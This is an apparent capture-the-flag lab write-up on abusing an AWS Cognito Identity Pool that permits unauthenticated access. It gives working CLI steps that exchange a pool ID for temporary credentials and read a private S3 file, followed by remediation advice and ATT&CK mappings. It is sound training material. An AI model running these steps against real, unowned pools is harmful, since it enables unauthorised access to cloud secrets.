# Cognito Identity Pool — Unauthenticated Identity

**Provider:** AWS | **Category:** Identity / Credential Abuse

## Scenario

A mobile app uses a Cognito Identity Pool to provide guest (unauthenticated) users with
limited AWS credentials for analytics purposes. The developer assigned the unauthenticated
role overly broad S3 permissions — including access to a private bucket containing
production secrets.

Any caller who knows the **Identity Pool ID** can exchange it for temporary AWS
credentials via the Cognito Identity Service without providing any login credentials.

## Attack Path

```
[Attacker] No credentials — only the Identity Pool ID (from lab output)
    |
    v
aws cognito-identity get-id --identity-pool-id <id>  -->  IdentityId
    |
    v
aws cognito-identity get-credentials-for-identity --identity-id <id>  -->  STS credentials
    |
    v
Export AccessKeyId / SecretKey / SessionToken
    |
    v
aws s3 cp s3://<bucket>/secret/flag.txt -  -->  flag
```

### Step 1 — Get an unauthenticated identity ID

```bash
POOL_ID="<identity_pool_id>"
ACCOUNT_ID="<account_id>"
REGION="eu-west-1"

IDENTITY_ID=$(aws cognito-identity get-id \
  --identity-pool-id "${POOL_ID}" \
  --account-id "${ACCOUNT_ID}" \
  --region "${REGION}" \
  --query "IdentityId" \
  --output text)
```

### Step 2 — Exchange for temporary AWS credentials

```bash
CREDS=$(aws cognito-identity get-credentials-for-identity \
  --identity-id "${IDENTITY_ID}" \
  --region "${REGION}")

export AWS_ACCESS_KEY_ID=$(echo "${CREDS}" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "${CREDS}" | jq -r '.Credentials.SecretKey')
export AWS_SESSION_TOKEN=$(echo "${CREDS}" | jq -r '.Credentials.SessionToken')
export AWS_DEFAULT_REGION="${REGION}"
```

### Step 3 — Read the flag

```bash
aws s3 cp s3://<flag_bucket>/secret/flag.txt -
```

## How to Fix in Production

1. **Disable unauthenticated identities** unless your application genuinely requires
   guest access: set `AllowUnauthenticatedIdentities: false`.
2. **Apply least-privilege to the unauthenticated role** — if guest access is needed,
   restrict to the absolute minimum (e.g., specific DynamoDB read, no S3).
3. **Never assign sensitive S3 buckets** to the unauthenticated role — keep those
   accessible only to authenticated, scoped roles.
4. **Use Attribute-Based Access Control (ABAC)** with Cognito principal tags to limit
   each identity to only their own data partition.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Steal Application Access Token | [T1528](https://attack.mitre.org/techniques/T1528/) |
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
